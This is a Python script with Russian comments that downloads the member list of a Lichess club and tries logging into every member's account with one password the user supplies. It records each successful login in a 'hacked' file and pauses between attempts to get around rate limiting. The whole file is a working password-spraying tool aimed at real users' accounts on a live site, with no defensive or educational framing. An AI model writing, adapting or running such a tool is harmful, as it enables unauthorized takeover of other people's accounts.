import ndjson
import requests

from config import *


def start(password, team):
    print(yellow + "[..] Получаем список, это может занять некоторое время...")
    r_m = requests.get('https://lichess.org/api/team/' + team + '/users')
    users = r_m.json(cls=ndjson.Decoder)

    # Выводим сообщение, что список готов
    print(green + f"[+] Список пользователей получен!")
    print(
        cyan + "[TIP] Запрос 200 означает, что акк взломан. 401 - не получилось. 429 - личесс заблокировал запрос(рекомендуется выключить программу)")
    # Начинаем перебор
    k = 0
    for user in users:

        #   Получаем ник участника
        username = user["username"]

        if (len(username) < 4): continue

        r = requests.post("https://lichess.org/login",
                          data={"username": username, "password": password, "remember": "true"},
                          headers={"X-Requested-With": "XMLHttpRequest",
                                   "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"})

        print(f"{get_ts()} {r}, {username}: {password}")
        k += 1

        if str(r) == "<Response [200]>":
            with open(f"hacked_checking/{team}.txt", "a", encoding="utf-8") as h_list:
                h_list.write(f"{get_ts()} {username}: {password} \n")

        time.sleep(5)
        if k % 10 == 0:
            time.sleep(20)  # ждем потому что таймаут после каждого 10 подбора


if __name__ == "__main__":
    start(password=input(green + "Введите пароль, которым вы хотите проверить клуб: " + magenta),
          team=input(yellow + "Введите ID клуба: " + magenta))
